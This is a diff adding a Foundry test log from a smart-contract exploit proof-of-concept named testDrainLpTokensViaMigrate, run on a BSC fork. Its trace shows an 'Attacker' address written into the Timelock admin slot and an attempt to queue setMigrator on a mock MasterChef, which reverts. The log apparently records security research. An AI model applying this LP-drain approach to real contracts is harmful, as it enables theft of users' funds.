@@ -1,0 +1,49 @@
+No files changed, compilation skipped
+2026-06-16T12:47:47.038524Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/104568840"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[FAIL: Timelock::queueTransaction: Call must come from admin.] testDrainLpTokensViaMigrate() (gas: 19419)
+2026-06-16T12:47:50.924214Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+2026-06-16T12:47:50.925169Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+2026-06-16T12:47:50.926724Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+2026-06-16T12:47:50.927384Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:47:50.927485Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:47:51.688760Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x2e234dae75c793f67a35089c9d99245e1c58470b)
+2026-06-16T12:47:51.691263Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:47:52.027510Z  WARN traces::etherscan: could not get etherscan info: ErrorResponse { status: "0", message: "NOTOK", result: Some("Max calls per sec rate limit reached (3/sec)") }
+Traces:
+  [1292488] ExploitTest::setUp()
+    ├─ [0] VM::label(Attacker: [0x000000000000000000000000000000000000dEaD], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Timelock: [0x4B6c8959a41475347226d51f37eC9a1E09F39a92], "Timelock")
+    │   └─ ← [Return]
+    ├─ [722782] → new SimpleERC20@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 3272 bytes of code
+    ├─ [380519] → new MockMasterChef@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 1676 bytes of code
+    ├─ [45330] SimpleERC20::mint(MockMasterChef: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100000000000000000000000 [1e23])
+    │   └─ ← [Stop]
+    ├─ [2824] SimpleERC20::balanceOf(Attacker: [0x000000000000000000000000000000000000dEaD]) [staticcall]
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [19419] ExploitTest::testDrainLpTokensViaMigrate()
+    ├─ [0] VM::store(Timelock: [0x4B6c8959a41475347226d51f37eC9a1E09F39a92], 0x0000000000000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000000000000000000000000000000000000000dead)
+    │   └─ ← [Return]
+    ├─ [599] Timelock::admin() [staticcall]
+    │   └─ ← [Return] Attacker: [0x000000000000000000000000000000000000dEaD]
+    ├─ [2518] Timelock::delay() [staticcall]
+    │   └─ ← [Return] 604800 [6.048e5]
+    ├─ [2704] Timelock::queueTransaction(MockMasterChef: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0, "setMigrator(address)", 0x000000000000000000000000000000000000000000000000000000000000dead, 1782218863 [1.782e9])
+    │   └─ ← [Revert] Timelock::queueTransaction: Call must come from admin.
+    └─ ← [Revert] Timelock::queueTransaction: Call must come from admin.
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.88s (818.07ms CPU time)
+
+Ran 1 test suite in 6.49s (3.88s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:ExploitTest
+[FAIL: Timelock::queueTransaction: Call must come from admin.] testDrainLpTokensViaMigrate() (gas: 19419)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
